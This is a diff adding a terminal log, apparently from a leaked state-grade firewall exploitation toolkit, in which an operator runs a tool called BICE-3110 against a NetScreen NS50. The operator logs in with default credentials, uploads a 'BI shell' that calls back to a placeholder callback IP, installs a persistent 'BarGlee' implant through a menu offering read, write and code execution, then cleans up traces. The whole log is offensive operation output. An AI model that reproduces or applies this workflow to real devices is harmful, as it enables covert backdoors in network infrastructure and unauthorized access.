@@ -1,0 +1,87 @@
+14:31:07 [/current/bin/FW/BARGLEE3100/Install/LP]# ./BICE-3110 --rport 2300 --rip 127.0.0.1 --cdip CALLBACKIP --cdport RHP --mode telnet --dat /current/bin/FW/BARGLEE3100/Dats/ns50ns25.5.0.0r9.0.xml --username netscreen --password netscreen
+        System Info:
+        Product         NS50
+        SN              XXXXXXXXXX
+        SW Ver          5.0.0r9.0
+        Last Saved OS   ns50ns25.5.0.0r9.0
+        CLI Prompt      NSC-50_A-> 
+        Up time         642 hours 58 minutes 11 seconds 
+        Checksum        9EA94FCB
+        RAM             Not Specified
+        Console Timeout 0(minute)
+
+        Dat file specified: /current/bin/FW/BARGLEE3100/Dats/ns50ns25.5.0.0r9.0.xml
+        Cksum of Clean OS: 9EA94FCB
+
+
+Open Interactive Console Session (y/n)? n
+
+Do you want to proceed; the BI shell will now be installed (y/n)? y
+Uploading BI shell [22852 bytes sent; 42320 bytes received]                              
+
+BI shell is ready. Pass execution to it? [y/n] y
+Received callback from 127.0.0.1:33026
+********************************************************************************
+SELECT:
+[0] Exit.
+[1] Target status.
+[2] Uninstall BGlee.
+[3] Install BarGlee.
+[4] Read data.
+[5] Write data.
+[6] Execute code.
+Enter selection: 1
+The status of the target is: unknown
+********************************************************************************
+SELECT:
+[0] Exit.
+[1] Target status.
+[2] Uninstall BGlee.
+[3] Install BarGlee.
+[4] Read data.
+[5] Write data.
+[6] Execute code.
+Enter selection: 3
+Target state undetermined
+Install anyway? y/n: y
+Enter file to install: TEST_BG3113_PPC_ns50_IM64ecff96.bin
+Malloc space, write BG, and activate? [y/n] y
+Exec returned: 06ba0b00
+Exec returned: 00000000
+********************************************************************************
+SELECT:
+[0] Exit.
+[1] Target status.
+[2] Uninstall BGlee.
+[3] Install BarGlee.
+[4] Read data.
+[5] Write data.
+[6] Execute code.
+Enter selection: 1
+The status of the target is: BG3103.
+********************************************************************************
+SELECT:
+[0] Exit.
+[1] Target status.
+[2] Uninstall BGlee.
+[3] Install BarGlee.
+[4] Read data.
+[5] Write data.
+[6] Execute code.
+Enter selection: 0
+Confirm exit [y/n]: y
+Cleaning safe space [22852 bytes sent; 21053 bytes received]                              
+Attempt 1 failed.
+Cleaning safe space [22852 bytes sent; 21053 bytes received]                              
+Slowing, and retrying using page_size: 2048
+Cleaning safe space [38760 bytes sent; 76234 bytes received]                              
+Attempt 2 failed.
+Cleaning safe space [38760 bytes sent; 76234 bytes received]                              
+Slowing, and retrying using page_size: 1024
+Cleaning safe space [61684 bytes sent; 120510 bytes received]                              
+Succeeded
+
+
+BARICE done
+
+
